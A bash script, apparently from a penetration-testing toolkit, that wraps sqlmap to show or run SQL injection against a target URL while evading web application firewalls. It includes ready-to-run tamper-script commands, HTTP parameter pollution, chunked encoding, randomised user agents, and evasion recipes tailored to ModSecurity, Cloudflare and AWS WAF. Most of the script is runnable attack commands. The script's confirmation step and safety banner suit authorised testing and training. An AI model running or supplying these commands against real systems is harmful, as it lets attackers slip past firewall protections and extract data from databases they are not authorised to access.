#!/usr/bin/env bash
# ============================================================================
# @description  Use tamper scripts and techniques to evade WAF/IDS detection
# @usage        sqlmap/bypass-waf.sh [target] [-h|--help] [-x|--execute] [-j|--json]
# @dependencies sqlmap, common.sh
# ============================================================================
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [target-url] [-h|--help] [-x|--execute] [-j|--json]"
    echo ""
    echo "Description:"
    echo "  Demonstrates WAF/IDS evasion techniques using sqlmap tamper scripts."
    echo "  Tamper scripts modify SQL injection payloads to bypass web application"
    echo "  firewalls and intrusion detection systems."
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")                                                    # Show bypass techniques"
    echo "  $(basename "$0") 'http://target/page.php?id=1'                      # Target a URL"
    echo "  $(basename "$0") -x 'http://target/page.php?id=1'                   # Execute against target"
    echo "  $(basename "$0") --help                                             # Show this help message"
    echo ""
    echo "Flags:"
    echo "  -h, --help     Show this help message"
    echo "  -j, --json     Output results as JSON (requires jq)"
    echo "  -x, --execute  Execute commands instead of displaying them"
}

parse_common_args "$@"
set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"

require_cmd sqlmap "brew install sqlmap"

TARGET="${1:-}"

json_set_meta "sqlmap" "$TARGET" "sql-injection"

confirm_execute "${1:-}"
safety_banner

info "=== WAF/IDS Bypass Techniques ==="
if [[ -n "$TARGET" ]]; then
    info "Target: ${TARGET}"
fi
echo ""

info "How tamper scripts work"
echo "   Tamper scripts modify SQL injection payloads before sending them."
echo "   They transform syntax that WAFs block into equivalent SQL that"
echo "   the database still understands but the WAF does not recognize."
echo ""
echo "   Common bypass strategies:"
echo "   - Replace spaces with comments: SELECT/**/1 FROM/**/users"
echo "   - Use BETWEEN instead of comparison operators"
echo "   - Encode characters: %53%45%4C%45%43%54 = SELECT"
echo "   - Randomize case: SeLeCt, sElEcT"
echo "   - Use equivalent functions: MID() instead of SUBSTRING()"
echo ""
echo "   Additional evasion techniques:"
echo "   - Random User-Agent headers to avoid fingerprinting"
echo "   - Delays between requests to avoid rate limiting"
echo "   - HTTP parameter pollution to confuse parsers"
echo "   - Chunked transfer encoding to split payloads"
echo ""

URL="${TARGET:-'http://target/page.php?id=1'}"

# 1. Space-to-comment bypass
run_or_show "1) Space-to-comment bypass — replaces spaces with /**/" \
    sqlmap -u "$URL" --batch --tamper=space2comment

# 2. Between-function bypass
run_or_show "2) Between bypass — replaces > with NOT BETWEEN 0 AND" \
    sqlmap -u "$URL" --batch --tamper=between

# 3. Character encoding bypass
run_or_show "3) Character encoding bypass — URL-encodes all characters" \
    sqlmap -u "$URL" --batch --tamper=charencode

# 4. Random case bypass
run_or_show "4) Random case bypass — randomizes keyword capitalization" \
    sqlmap -u "$URL" --batch --tamper=randomcase

# 5. Combine multiple tamper scripts
run_or_show "5) Combine multiple tamper scripts for stronger evasion" \
    sqlmap -u "$URL" --batch --tamper=space2comment,between,randomcase

# 6. Random user agent + delay
run_or_show "6) Random user agent + delay between requests" \
    sqlmap -u "$URL" --batch --random-agent --delay=2

# 7. HTTP parameter pollution
run_or_show "7) HTTP parameter pollution" \
    sqlmap -u "$URL" --batch --hpp

# 8. Chunked transfer encoding
run_or_show "8) Chunked transfer encoding — splits payload across chunks" \
    sqlmap -u "$URL" --batch --chunked

# 9. Use a proxy for manual verification
run_or_show "9) Route through a proxy for manual payload inspection" \
    sqlmap -u "$URL" --batch --proxy=http://127.0.0.1:8080 --tamper=space2comment

# 10. List all available tamper scripts
info "10) List all available tamper scripts"
echo "    sqlmap --list-tampers"
echo ""
json_add_example "List all available tamper scripts" \
    "sqlmap --list-tampers"

json_finalize

# Interactive demo (skip if non-interactive)
if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
    [[ ! -t 0 ]] && exit 0

    echo ""
    info "Tamper scripts by WAF type:"
    echo ""
    echo "   ModSecurity / OWASP CRS:"
    echo "   --tamper=space2comment,between,randomcase,charencode"
    echo ""
    echo "   Cloudflare:"
    echo "   --tamper=between,randomcase,space2comment --random-agent"
    echo ""
    echo "   AWS WAF:"
    echo "   --tamper=charencode,space2comment --chunked --random-agent"
    echo ""
    echo "   Generic / Unknown WAF:"
    echo "   --tamper=space2comment,between,randomcase,charencode --random-agent --delay=1"
    echo ""
    echo "   Tips:"
    echo "   - Start with a single tamper and add more if blocked"
    echo "   - Use --proxy=http://127.0.0.1:8080 with Burp Suite to inspect payloads"
    echo "   - Combine tamper scripts with --delay and --random-agent"
    echo "   - Run sqlmap --list-tampers for the full list with descriptions"
    echo ""
fi
